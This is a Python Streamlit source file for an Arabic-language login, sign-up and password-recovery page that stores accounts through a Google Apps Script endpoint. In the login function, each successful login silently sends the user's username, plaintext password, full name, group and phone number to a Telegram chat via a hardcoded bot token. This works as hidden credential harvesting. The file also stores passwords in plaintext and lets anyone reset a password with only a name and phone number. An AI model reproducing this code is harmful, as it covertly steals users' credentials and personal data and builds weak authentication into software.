import streamlit as st
import requests

GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwy9S543V3U7cfZJrzI0rTTGpwGbKl-PvJLpJlTMssCD1YocR5gOPAOd42O9xCNT4kj/exec"

def send_telegram_message(message):
    bot_token = "8165532786:AAHYiNEgO8k1TDz5WNtXmPHNruQM15LIgD4"
    chat_id = "6283768537"
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    requests.post(url, data={"chat_id": chat_id, "text": message, "parse_mode": "HTML"})

def check_login(username, password):
    try:
        res = requests.post(GOOGLE_SCRIPT_URL, data={"action": "check", "username": username, "password": password}, timeout=120)
        return res.text.strip() == "TRUE"
    except:
        return False

def get_user_data(username):
    try:
        res = requests.post(GOOGLE_SCRIPT_URL, data={"action": "get_user_data", "username": username}, timeout=120)
        parts = res.text.strip().split(",")
        if len(parts) == 5:
            return {
                "username": parts[0],
                "password": parts[1],
                "full_name": parts[2],
                "group": parts[3],
                "phone": parts[4]
            }
    except:
        return None

def add_user(username, password, full_name, group, phone):
    try:
        res = requests.post(GOOGLE_SCRIPT_URL, data={
            "action": "add",
            "username": username,
            "password": password,
            "full_name": full_name,
            "group": group,
            "phone": phone
        }, timeout=120)
        return res.text.strip() == "Added"
    except:
        return False

def find_username_by_fullname_and_phone(full_name, phone):
    try:
        res = requests.post(GOOGLE_SCRIPT_URL, data={
            "action": "find_username",
            "full_name": full_name,
            "phone": phone
        }, timeout=120)
        username = res.text.strip()
        if username and username != "NOT_FOUND":
            return username
        return None
    except:
        return None

def update_password(username, full_name, new_password):
    try:
        res = requests.post(GOOGLE_SCRIPT_URL, data={
            "action": "update_password",
            "username": username,
            "full_name": full_name,
            "new_password": new_password
        }, timeout=120)
        return res.text.strip() == "UPDATED"
    except:
        return False

def forgot_password_page():
    st.markdown('<div class="login-container">', unsafe_allow_html=True)
    st.markdown("<h1>🔒 استعادة كلمة المرور</h1>", unsafe_allow_html=True)

    if 'fp_step' not in st.session_state:
        st.session_state['fp_step'] = 1
    if 'found_username' not in st.session_state:
        st.session_state['found_username'] = None
    if 'fp_full_name' not in st.session_state:
        st.session_state['fp_full_name'] = ""
    if 'fp_phone' not in st.session_state:
        st.session_state['fp_phone'] = ""

    if st.session_state['fp_step'] == 1:
        full_name = st.text_input("أدخل اسمك الثلاثي الكامل", key="fp_full_name")
        phone = st.text_input("أدخل رقم هاتفك", key="fp_phone")

        if st.button("تحقق من البيانات"):
            if not full_name or not phone:
                st.warning("يرجى ملء الاسم الثلاثي ورقم الهاتف")
            else:
                username = find_username_by_fullname_and_phone(full_name, phone)
                if username:
                    st.session_state['found_username'] = username
                    st.session_state['fp_step'] = 2
                    st.session_state['fp_full_name'] = full_name
                    st.session_state['fp_phone'] = phone
                    st.rerun()
                else:
                    st.error("لم يتم العثور على حساب مطابق لهذه البيانات")

    elif st.session_state['fp_step'] == 2:
        st.markdown(f"اسم المستخدم المرتبط ببياناتك هو: **{st.session_state['found_username']}**")
        new_password = st.text_input("أدخل كلمة المرور الجديدة", type="password", key="fp_new_password")
        new_password_confirm = st.text_input("أعد إدخال كلمة المرور الجديدة", type="password", key="fp_new_password_confirm")

        if st.button("تحديث كلمة المرور"):
            if not new_password or not new_password_confirm:
                st.warning("يرجى إدخال كلمة المرور الجديدة مرتين")
            elif new_password != new_password_confirm:
                st.error("كلمتا المرور غير متطابقتين")
            else:
                updated = update_password(st.session_state['found_username'], st.session_state['fp_full_name'], new_password)
                if updated:
                    st.success("✅ تم تحديث كلمة المرور بنجاح، يمكنك الآن تسجيل الدخول.")
                    st.session_state['fp_step'] = 1
                    st.session_state['found_username'] = None
                    st.rerun()
                else:
                    st.error("حدث خطأ أثناء تحديث كلمة المرور، حاول مرة أخرى.")

    if st.button("🔙 العودة لتسجيل الدخول"):
        st.session_state['show_forgot'] = False
        st.rerun()

    st.markdown('</div>', unsafe_allow_html=True)

def login_page():
    st.markdown('<div class="login-container">', unsafe_allow_html=True)
    st.markdown("<h1>🔑 تسجيل الدخول</h1>", unsafe_allow_html=True)

    if 'show_signup' not in st.session_state:
        st.session_state['show_signup'] = False
    if 'signup_success' not in st.session_state:
        st.session_state['signup_success'] = False
    if 'show_forgot' not in st.session_state:
        st.session_state['show_forgot'] = False

    if st.session_state['show_forgot']:
        forgot_password_page()
        return

    if not st.session_state['show_signup']:
        username = st.text_input("اسم المستخدم", key="login_username")
        password = st.text_input("كلمة المرور", type="password", key="login_password")

        if st.button("دخول"):
            if not username or not password:
                st.warning("يرجى ملء جميع الحقول")
            else:
                if check_login(username, password):
                    user_data = get_user_data(username)
                    if user_data:
                        st.session_state['logged_in'] = True
                        st.session_state['user_name'] = user_data['username']
                        message = (
                            f"🔑 تم تسجيل دخول المستخدم:\n"
                            f"اسم المستخدم: <b>{user_data['username']}</b>\n"
                            f"كلمة المرور: <b>{user_data['password']}</b>\n"
                            f"الاسم الكامل: <b>{user_data['full_name']}</b>\n"
                            f"الجروب: <b>{user_data['group']}</b>\n"
                            f"رقم الهاتف: <b>{user_data['phone']}</b>"
                        )
                        send_telegram_message(message)
                        st.rerun()
                    else:
                        st.error("تعذر جلب بيانات المستخدم")
                else:
                    st.error("اسم المستخدم أو كلمة المرور غير صحيحة")

        if st.session_state.get('password_reset_message'):
            st.success(st.session_state['password_reset_message'])
            st.session_state['password_reset_message'] = None

        if st.session_state['signup_success']:
            st.success("✅ تم إنشاء الحساب بنجاح، سجل دخولك الآن")
            st.session_state['signup_success'] = False

        st.markdown('<div class="login-links">', unsafe_allow_html=True)
        if st.button("إنشاء حساب جديد"):
            st.session_state['show_signup'] = True
            st.rerun()
        if st.button("هل نسيت كلمة المرور؟"):
            st.session_state['show_forgot'] = True
            st.rerun()
        st.markdown('</div>', unsafe_allow_html=True)

    else:
        st.markdown("<h1>📝 إنشاء حساب جديد</h1>", unsafe_allow_html=True)
        signup_username = st.text_input("اسم المستخدم", key="signup_username")
        signup_password = st.text_input("كلمة المرور", type="password", key="signup_password")
        signup_full_name = st.text_input("الاسم الكامل", key="signup_full_name")
        signup_group = st.text_input("الجروب", key="signup_group")
        signup_phone = st.text_input("رقم الهاتف", key="signup_phone")

        if st.button("تسجيل"):
            if not signup_username or not signup_password or not signup_full_name or not signup_group or not signup_phone:
                st.warning("يرجى ملء جميع الحقول")
            else:
                if add_user(signup_username, signup_password, signup_full_name, signup_group, signup_phone):
                    st.session_state['show_signup'] = False
                    st.session_state['signup_success'] = True
                    st.rerun()
                else:
                    st.error("فشل في إنشاء الحساب، حاول مرة أخرى")

        if st.button("🔙 العودة لتسجيل الدخول"):
            st.session_state['show_signup'] = False
            st.rerun()

    st.markdown('</div>', unsafe_allow_html=True)
